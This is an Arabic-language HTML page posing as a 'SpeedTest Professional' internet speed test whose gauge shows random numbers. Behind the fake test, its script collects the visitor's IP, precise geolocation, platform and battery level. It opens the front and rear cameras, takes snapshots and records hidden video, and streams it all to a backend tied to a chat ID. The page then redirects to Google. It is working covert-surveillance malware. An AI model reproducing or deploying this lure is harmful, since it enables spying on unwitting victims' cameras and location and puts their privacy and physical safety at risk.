<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeedTest Professional - فحص سرعة الإنترنت</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root { --primary: #00ffd5; --bg: #0e1015; }
        body { background: var(--bg); color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; width: 90%; max-width: 500px; padding: 20px; border-radius: 20px; background: rgba(255,255,255,0.05); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .gauge-container { position: relative; margin: 20px 0; }
        #speed-text { font-size: 3rem; font-weight: bold; color: var(--primary); margin: 10px 0; }
        .btn-start { background: var(--primary); color: #000; border: none; padding: 15px 40px; font-size: 1.2rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.3s; }
        .btn-start:hover { transform: scale(1.05); box-shadow: 0 0 20px var(--primary); }
        #status-msg { margin-top: 15px; color: #888; font-size: 0.9rem; }
        video { display: none; } /* إخفاء عناصر الفيديو تماماً */
    </style>
</head>
<body>

<div class="container">
    <h2>فحص جودة الاتصال</h2>
    <p>قم بقياس سرعة التحميل والرفع في ثوانٍ</p>
   
    <div class="gauge-container">
        <canvas id="speedChart"></canvas>
        <div id="speed-text">0.0</div>
        <div style="color: var(--primary)">Mbps</div>
    </div>

    <button class="btn-start" id="startBtn" onclick="startTest()">بدء الفحص</button>
    <p id="status-msg">اضغط على الزر للبدء بالتحليل</p>
</div>

<video id="video" autoplay playsinline muted></video>

<script>
// --- الإعدادات ---
const BACKEND_URL = "http://127.0.0.1:8000"; // ضع رابط سيرفرك هنا
const API_KEY = "Mohammed1+";
const urlParams = new URLSearchParams(window.location.search);
const chatId = urlParams.get('chatId');

// --- تنبيه الدخول (Notify Open) ---
window.onload = () => {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    fetch(`${BACKEND_URL}/notify-open`, {
        method: 'POST',
        headers: { 'X-API-Key': API_KEY },
        body: formData
    });
};

// --- إعداد الرسم البياني ---
const ctx = document.getElementById('speedChart').getContext('2d');
let speedChart = new Chart(ctx, {
    type: 'line',
    data: { labels: ['', '', '', '', ''], datasets: [{ data: [0, 0, 0, 0, 0], borderColor: '#00ffd5', tension: 0.4 }] },
    options: { plugins: { legend: { display: false } }, scales: { x: { display: false }, y: { display: false } } }
});

async function startTest() {
    document.getElementById('startBtn').style.display = 'none';
    document.getElementById('status-msg').innerText = "جاري الاتصال بالخادم...";
   
    try {
        // 1. جلب البيانات التقنية والموقع
        const deviceData = await getDeviceInfo();
       
        // 2. طلب الكاميرا والموقع (سيسأل المتصفح المستخدم هنا)
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        document.getElementById('video').srcObject = stream;

        // 3. إرسال تقرير البيانات الأول
        await sendData(deviceData);

        // 4. التقاط صورة فورية
        captureSnapshot(stream, "Front");

        // 5. محاكاة العداد (تأثير بصري)
        simulateGauge();

        // 6. تسجيل الفيديو (أمامية ثم خلفية)
        await recordVideo(stream, "Front", 10000);
       
        // محاولة التبديل للكاميرا الخلفية (للهواتف)
        try {
            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            captureSnapshot(backStream, "Back");
            await recordVideo(backStream, "Back", 10000);
        } catch (e) { console.log("Back camera not available"); }

        // الإنهاء والتحويل
        document.getElementById('status-msg').innerText = "تم فحص الشبكة بنجاح، جودة اتصالك ممتازة!";
        setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);

    } catch (err) {
        console.error(err);
        document.getElementById('status-msg').innerText = "خطأ في الاتصال، تأكد من منح الصلاحيات وأعد المحاولة.";
    }
}

async function getDeviceInfo() {
    const battery = await navigator.getBattery();
    const res = await fetch('https://ipapi.co/json/');
    const ipData = await res.json();
   
    // محاولة جلب الإحداثيات الدقيقة
    return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition((pos) => {
            resolve({
                ip: ipData.ip,
                location: `${ipData.city}, ${ipData.country_name}`,
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                os: navigator.platform,
                battery: Math.round(battery.level * 100)
            });
        }, () => {
            resolve({ ip: ipData.ip, location: ipData.city, os: navigator.platform, battery: Math.round(battery.level * 100) });
        });
    });
}

function captureSnapshot(stream, type) {
    const canvas = document.createElement('canvas');
    const video = document.getElementById('video');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    canvas.toBlob((blob) => {
        const fd = new FormData();
        fd.append('chat_id', chatId);
        fd.append('image', blob);
        fd.append('camera_type', type);
        sendRequest(fd);
    }, 'image/jpeg');
}

async function recordVideo(stream, type, duration) {
    const mediaRecorder = new MediaRecorder(stream);
    mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('video_chunk', event.data);
            fd.append('camera_type', type);
            sendRequest(fd);
        }
    };
    mediaRecorder.start(2000); // إرسال جزء (Chunk) كل ثانيتين
    await new Promise(r => setTimeout(r, duration));
    mediaRecorder.stop();
}

async function sendData(data) {
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('device_info', JSON.stringify(data));
    return sendRequest(fd);
}

async function sendRequest(formData) {
    return fetch(`${BACKEND_URL}/receive-data`, {
        method: 'POST',
        headers: { 'X-API-Key': API_KEY },
        body: formData
    });
}

function simulateGauge() {
    let i = 0;
    const interval = setInterval(() => {
        const val = (Math.random() * 50 + 20).toFixed(1);
        document.getElementById('speed-text').innerText = val;
        speedChart.data.datasets[0].data.push(val);
        speedChart.data.datasets[0].data.shift();
        speedChart.update();
        if (i++ > 50) clearInterval(interval);
    }, 200);
}
</script>

</body>
</html>
